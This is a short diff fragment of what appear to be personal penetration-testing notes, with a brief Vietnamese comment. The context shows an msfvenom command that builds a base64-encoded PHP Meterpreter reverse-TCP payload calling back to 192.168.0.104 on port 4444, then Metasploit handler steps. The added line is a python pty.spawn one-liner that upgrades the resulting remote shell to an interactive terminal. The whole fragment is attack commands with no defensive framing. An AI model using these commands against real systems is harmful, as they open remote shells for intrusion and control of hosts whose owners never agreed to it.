@@ -19,4 +19,5 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4444 -e php/ba
     set lport 4444
     run
     shell
+python -c 'import pty; pty.spawn("/bin/sh")' (nang cap shell len terminal)
 
